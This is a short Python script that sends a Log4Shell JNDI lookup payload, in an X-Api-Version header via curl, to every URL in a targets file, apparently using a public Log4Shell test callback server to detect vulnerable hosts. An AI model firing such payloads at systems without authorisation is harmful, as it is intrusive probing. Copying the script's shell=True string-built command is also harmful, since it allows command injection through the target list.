#!/path/to/python
import os
import time
import subprocess

targets_txt = "targets.txt"

def scan():
    targets = []
    with open(targets_txt, 'r', encoding='latin-1') as f:
        targets.extend(f.readlines())

    for target in targets:
        check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
        bashCommand = "curl " + f"{target} " + "-k -H " + f"'X-Api-Version: {check_url}'"
        info = subprocess.run(bashCommand, capture_output=True, shell=True)
        print(info)

if __name__ == '__main__':
    scan()


